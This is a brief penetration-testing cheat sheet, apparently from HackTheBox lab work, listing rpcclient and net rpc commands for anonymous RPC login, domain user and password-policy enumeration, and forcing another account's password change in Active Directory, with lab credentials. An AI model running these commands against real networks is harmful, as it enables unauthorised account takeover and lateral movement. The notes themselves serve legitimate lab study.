#lateral_movement 
```powershell
rpcclient -U Administrator%'P@ssw0rd' 10.10.111.10
rpcclient -U "" 10.211.11.10 -N

-U: Used to specify the username, in our case, we are using an empty string for anonymous login.

-N: Tells RPC not to prompt us for a password.
```


force change password (rpcclient):
```bash
rpcclient -U ant.edwards%'Antman2025!' 10.10.11.70
setuserinfo2 adam.silver 23 'NewPassword123!'

# 23 is the SetPassword info level
```


force change password (net rpc):
```bash
net rpc password 'adam.silver' 'P@ssw4rd123' -U 'PUPPY.HTB'/'ant.edwards'%'Antman2025!' -S '10.10.11.70'

```

---
useful commands
```bash
rpcclient $> getdompwinfo # get domain password policy
rpcclient $> enumdomusers # get domain users
rpcclient $> queryuser 0x457 # query a certain user
```


---
```bash
rpcinfo -p # asks RPC to list all the ports
```